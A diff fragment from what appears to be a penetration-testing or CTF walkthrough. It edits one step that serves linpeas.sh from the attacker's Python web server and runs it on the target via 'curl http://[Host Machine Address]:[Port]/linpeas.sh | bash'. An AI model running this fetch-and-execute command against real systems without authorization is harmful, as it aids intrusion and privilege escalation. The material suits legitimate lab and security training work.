@@ -128,7 +128,7 @@ Host _python web server_ in the directory with _linpeas.sh_ in it:
 Curl that in the _ssh_ session to run it, use this to run it directly after curling:
 
 ```
-curl [Python Server Address/linpeas.sh] | bash
+curl http://[Host Machine Address]:[Port]/linpeas.sh | bash
 ```
 
 ![image](https://github.com/user-attachments/assets/c5e2ea11-eaf6-4d14-a028-199c96e53d71)
